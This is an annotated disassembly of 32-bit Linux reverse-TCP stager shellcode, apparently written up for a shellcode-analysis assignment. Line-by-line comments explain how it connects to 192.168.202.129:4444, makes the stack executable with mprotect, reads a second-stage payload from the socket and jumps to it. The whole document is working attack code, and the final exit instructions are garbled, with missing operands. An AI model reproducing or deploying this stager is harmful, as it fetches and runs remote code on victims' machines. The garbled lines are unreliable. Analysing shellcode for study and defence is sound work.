
00000000      xor ebx,ebx             ; Clear EBX
00000002      mul ebx                 ; Clear EAX, EDX
00000004      push ebx                ; [0x0]
00000005      inc ebx                 ; set ebx to 1 (SYS_SOCKET)
00000006      push ebx                ; [0x1, 0x0]
00000007      push byte +0x2          ; [0x2, 0x1, 0x0]
00000009      mov al,0x66             ; SYSCALL(0x66) // man 2 socketcall
0000000B      mov ecx,esp             ; mov *args into ecx
0000000D      int 0x80                ; socketcall(1, *esp) -> socket(2, 1, 0) -> socket(AF_INET, SOCK_STREAM, 0) (see Assignment 1 for details)


0000000F      test eax,eax            ; Ensure EAX is not negative
00000011      js 0x57                 ; If EAX < 0, exit
00000013      xchg eax,edi            ; Move socket fd (SOCKFD) to EDI
00000014      pop ebx                 ; Put 0x2 into ebx // [0x1, 0x0]
00000015      push dword 0x81caa8c0   ; [0x81caa8c0, 0x1, 0x0] // IP Address (192.168.202.129)
0000001A      push dword 0x5c110002   ; [0x5c110002, 0x81caa8c0, 0x1, 0x0] // sin_port and sin_family (4444, 0x0002)
0000001F      mov ecx,esp             ; ecx -> [0x5c110002, 0x81caa8c0, 0x1, 0x0]
00000021      push byte +0x66         ; prepare for syscall
00000023      pop eax                 ; SYSCALL(0x66) // man 2 socketcall
00000024      push eax                ; [0x66, 0x5c110002, 0x81caa8c0, 0x1, 0x0]
00000025      push ecx                ; [*(0x5c110002, ...), 0x66, 0x5c110002, 0x81caa8c0, 0x1, 0x0]
00000026      push edi                ; [SOCKFD, *(0x5c110002, ...), 0x66, 0x5c110002, 0x81caa8c0, 0x1, 0x0]
00000027      mov ecx,esp             ; ecx -> [SOCKFD, *(0x5c110002, ...), 0x66, 0x5c110002, 0x81caa8c0, 0x1, 0x0]
00000029      inc ebx                 ; EBX = 0x3 (SYS_CONNECT)
0000002A      int 0x80                ; socketcall(3, [SOCKFD, *(0x5c110002, 0x81caa8c0, 0x1, 0x0)])


0000002C      test eax,eax            ; Check if return value was negative
0000002E      js 0x57                 ; If negative, jump to exit
00000030      mov dl,0x7              ; edx = 0x7
00000032      mov ecx,0x1000          ; ecx = 0x1000
00000037      mov ebx,esp             ; ebx = [SOCKFD, *(0x5c110002, ...), 0x66, 0x5c110002, 0x81caa8c0, 0x1, 0x0]
00000039      shr ebx,byte 0xc        ; align ebx to a page
0000003C      shl ebx,byte 0xc        ; by clearing last 12 bits of ebx
0000003F      mov al,0x7d             ; SYSCALL(125)
00000041      int 0x80                ; mprotect(ebx, 0x1000, 7) -> make 0x1000 bytes at the stack RWX


00000043      test eax,eax            ; Test for negative return code
00000045      js 0x57                 ; If negative, jump to exit
00000047      pop ebx                 ; EBX = SOCKFD // [*(0x5c110002, ...), 0x66, 0x5c110002, 0x81caa8c0, 0x1, 0x0]
00000048      mov ecx,esp             ; ECX -> [*(0x5c110002, ...), 0x66, 0x5c110002, 0x81caa8c0, 0x1, 0x0]
0000004A      cdq                     ; clear EDX (by extending sign bit of eax to edx)
0000004B      mov dh,0xc              ; EDX = 0xC00
0000004D      mov al,0x3              ; SYSCALL(0x3) // man 2 read
0000004F      int 0x80                ; read(SOCKFD, ECX (STACK), 0x00000C00)


00000051      test eax,eax            ; Test for negative return code
00000053      js 0x57                 ; If negative, jump to exit
00000055      jmp ecx                 ; If it wasn't, jump to ECX which contains our staged shellcode
00000057      mo  v   ,0x1             ; SYSCALL(0x1) // man 2 exit
0000005C      mo  v   ,0x1             ; return code of 1 (error because staged shellcode didn't make it)
00000061      int 0x80                ; exit(1)
